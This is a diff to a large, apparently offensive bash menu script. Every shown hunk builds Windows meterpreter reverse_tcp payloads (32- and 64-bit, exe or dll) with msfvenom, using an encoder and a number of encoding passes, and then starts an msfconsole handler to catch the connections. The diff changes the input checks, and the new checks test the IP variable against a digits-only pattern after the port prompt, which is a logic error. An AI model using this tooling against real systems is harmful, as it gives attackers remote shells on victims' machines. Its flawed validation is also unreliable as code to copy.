@@ -10304,7 +10304,7 @@ while true; do
 		then
 			echo "Digit your PORT"
 			read -p "(default, 9001): " -i "9001" MPRT
-			if [[ "$MIP" != "" ]];
+			if [[ "$MIP" =~ ^[0-9]+$ ]];
 			then
 				select EXT in "exe" "dll"
 				do
@@ -10312,7 +10312,7 @@ while true; do
 					do
 						echo "Digit how many iterations of encoding"
 						read -p "(default, 10): " -i "10" ITE
-						if [[ "$ITE" != "" ]];
+						if [[ "$ITE" =~ ^[0-9]+$ ]];
 						then
 							msfvenom -p windows/meterpreter/reverse_tcp -ax86 -e $ENC -i $ITE -f $EXT LHOST=$MIP LPORT=$MPRT > reverse_32bit.$EXT
 							msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
@@ -10330,7 +10330,7 @@ while true; do
 		then
 			echo "Digit your PORT"
 			read -p "(default, 9001): " -i "9001" MPRT
-			if [[ "$MIP" != "" ]];
+			if [[ "$MIP" =~ ^[0-9]+$ ]];
 			then
 				select EXT in "exe" "dll"
 				do
@@ -10338,7 +10338,7 @@ while true; do
 					do
 						echo "Digit how many iterations of encoding"
 						read -p "(default, 10): " -i "10" ITE
-						if [[ "$ITE" != "" ]];
+						if [[ "$ITE" =~ ^[0-9]+$ ]];
 						then
 							msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -e $ENC -i $ITE -f $EXT LHOST=$MIP LPORT=$MPRT > reverse_64bit.$EXT
 							msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
